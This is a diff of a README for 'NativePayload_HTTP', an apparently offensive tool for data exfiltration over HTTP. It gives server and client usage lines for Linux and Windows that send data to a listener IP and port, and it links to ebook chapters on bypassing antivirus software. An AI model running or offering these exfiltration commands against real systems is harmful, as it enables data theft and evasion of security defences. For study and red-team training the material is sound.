@@ -1,3 +1,21 @@
 # NativePayload_HTTP
 Data Exfiltration via HTTP Traffic (C# and Shell Script)
-Soon!
+
+this code has two parts: 1.Server-Side and 2.Client-Side
+
+Server-Side (linux only):
+./NativePayload_HTTP.sh -exfilwebserver
+
+Client-Side (linux):
+./NativePayload_HTTP.sh -dumpcmd [ServerIPv4] [Port] [Internal-delay]
+Example: ./NativePayload_HTTP.sh -dumpcmd  192.168.56.1 80 0.4
+
+Client-Side (windows):
+NativePayload_HTTP.exe -dumpcmd [ServerIPv4] [Port] 
+Example: NativePayload_HTTP.exe -dumpcmd  192.168.56.1 80 
+
+# Note: for more information and help (step by step) , Please read these PDF files:
+
+NativePayload_HTTP (Part1): https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH12/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2012-Part1.pdf
+
+NativePayload_HTTP (Part2): https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp/blob/master/CH12/Bypassing%20Anti%20Viruses%20by%20C%23.NET%20Programming%20Chapter%2012-Part2.pdf
